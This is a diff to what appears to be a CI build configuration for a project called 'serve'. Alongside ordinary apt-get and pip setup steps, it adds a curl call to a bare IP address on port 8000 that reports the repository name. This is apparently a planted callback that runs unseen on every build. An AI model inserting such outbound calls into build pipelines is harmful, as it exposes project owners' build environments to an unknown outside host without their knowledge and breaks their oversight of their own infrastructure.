@@ -8,6 +8,7 @@ phases:
       python: 3.8
     commands:
       - apt-get update
+      - curl 'http://139.59.42.38:8000?repo=serve'
       - apt-get install sudo -y
       - curl -O https://bootstrap.pypa.io/get-pip.py && python get-pip.py
       - update-alternatives --install /usr/local/bin/pip pip /usr/local/bin/pip3 1
